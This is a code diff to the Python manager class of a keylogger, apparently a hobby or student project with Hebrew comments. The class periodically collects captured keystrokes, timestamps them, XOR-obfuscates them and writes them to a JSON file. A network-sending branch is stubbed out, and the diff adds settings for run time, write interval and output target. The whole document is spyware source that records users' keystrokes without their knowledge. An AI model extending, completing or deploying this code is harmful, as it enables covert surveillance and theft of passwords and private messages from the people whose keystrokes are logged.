@@ -6,17 +6,20 @@ from encryption import Encryption
 
 class Manager:
 
-    def __init__(self, time):
-        self.time = time
+    def __init__(self,time_to_run = 0,wright_to = "json", time_wright = 60):
+        self.time_wright = time_wright
         self.keylogger = KeyLogger()
         self.file_writer = FileWriter()
         self.encryption = Encryption(5)
         self.running = False
+        self.wright_to = wright_to
+        self.time_to_run = time_to_run
+
 
     def collect_keys(self):
         while self.running:
             try:
-                time.sleep(self.time)
+                time.sleep(self.time_wright)
                 logged_keys = self.keylogger.get_logged_keys()
                 if logged_keys:
                     timestamp = datetime.datetime.now().strftime("%d/%m/%Y %H:%M")
@@ -26,16 +29,18 @@ class Manager:
                     encrypted_data = self.encryption.xor_encrypt_decrypt_dict_list(data)
 
                     # שליחה לקובץ
-                    self.file_writer.Writes_to_file(encrypted_data)
+                    if self.wright_to == "json":
+                        self.file_writer.Writes_to_file(encrypted_data)
 
                     #  שליחה לרשת (אם מופעל)
-                    if self.file_writer.Writes_to_network:
+                    elif self.wright_to == "network":
                         pass  # self.network_writer.send(encrypted_data)
 
                     #  ניקוי ה-buffer
                     self.keylogger.clear_buffer()  # שים לב שזה כנראה צריך להיות בתוך KeyLogger
             except Exception as e:
                 print(f"Error collecting keystrokes: {e}")
+
 
     def start(self):
         self.running = True
